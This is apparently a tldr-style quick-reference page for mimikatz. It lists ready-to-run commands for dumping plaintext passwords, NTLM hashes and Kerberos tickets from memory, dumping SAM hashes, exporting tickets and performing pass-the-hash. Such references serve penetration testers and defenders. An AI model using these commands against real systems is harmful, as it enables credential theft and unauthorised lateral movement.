# mimikatz

Interact with Windows credentials, perform credential dumping, token manipulation, and more. Requires administrator privileges and typically runs on Windows.

## Usage
- `mimikatz` : run mimikatz in interactive mode
- `mimikatz "privilege::debug"` : enable debug privileges (needed for most operations)
- `mimikatz "sekurlsa::logonpasswords"` : dump plaintext passwords, NTLM hashes, and Kerberos tickets from memory
- `mimikatz "sekurlsa::pth /user:username /domain:domain /ntlm:hash /run:cmd"` : pass-the-Hash with a specific NTLM hash and launch a command
- `mimikatz "lsadump::sam"` : dump local SAM database hashes
- `mimikatz "kerberos::list /export"` : extract Kerberos tickets and export to a file
- `exit` : [Interactive] Exit mimikatz

## Notes
A Windows command: this page is for reference, it does not run on Linux or macOS.

## Categories
security, windows

## Links
- More information: https://github.com/gentilkiwi/mimikatz
- tldr page: https://tldr.inbrowser.app/pages/windows/mimikatz
